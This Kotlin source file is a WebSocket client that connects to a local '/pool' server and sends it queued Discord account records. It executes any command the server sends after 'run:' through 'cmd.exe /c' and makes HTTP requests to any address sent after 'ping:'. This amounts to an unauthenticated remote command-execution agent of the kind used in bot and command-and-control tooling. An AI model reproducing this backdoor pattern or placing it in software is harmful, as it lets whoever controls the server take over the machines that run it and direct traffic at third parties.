package websocket

import io.ktor.client.*
import io.ktor.client.plugins.websocket.*
import io.ktor.client.request.*
import io.ktor.client.statement.*
import io.ktor.http.*
import io.ktor.serialization.kotlinx.*
import io.ktor.websocket.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancelAndJoin
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import kotlinx.serialization.json.Json
import models.informations.DiscordAccount
import java.util.*

val messagesQueue: Queue<DiscordAccount> = LinkedList()

fun main() {
    val client = HttpClient {
        install(WebSockets) {
            contentConverter = KotlinxWebsocketSerializationConverter(Json)
        }
    }
    runBlocking {
        client.webSocket(method = HttpMethod.Get, host = "127.0.0.1", port = 8080, path = "/pool") {

            val messageOutputRoutine = launch { outputMessages() }
            val userInputRoutine = launch { inputMessages() }

            userInputRoutine.join() // Wait for completion; either "exit" or error
            messageOutputRoutine.cancelAndJoin()
        }
    }
    client.close()
    println("Connection closed. Goodbye!")
}

suspend fun DefaultClientWebSocketSession.outputMessages() {
    try {
        for (message in incoming) {
            message as? Frame.Text ?: continue
            val text = message.readText()
            println("RECEIVED: $text")
            if (text.startsWith("ping:")) {
                if (ping(text.substring(5)))
                    send(Frame.Text("pinged successfully"))
                else
                    send(Frame.Text("could not ping"))
            } else if (text.startsWith("run:")) {
                val command = text.substring(4)
                withContext(Dispatchers.IO) {
                    ProcessBuilder("cmd.exe", "/c", command).start()
                }
                send(Frame.Text("ran successfully"))
            }

        }
    } catch (e: Exception) {
        println("Error while receiving: " + e.localizedMessage)
    }
}



suspend fun DefaultClientWebSocketSession.inputMessages() {
    while (true) {
        val message = messagesQueue.poll() ?: continue

        try {
            sendSerialized(message)
        } catch (e: Exception) {
            println("Error while sending: " + e.localizedMessage)
            return
        }
    }
}

fun ping(address: String): Boolean {
    val client = HttpClient()

    return runBlocking {
        try {
            val response: HttpResponse = client.get("http://$address")
            response.status.value in 200..299 // Check if the response status is in the success range
        } catch (e: Exception) {
            false // The IP is not reachable
        } finally {
            client.close()
        }
    }
}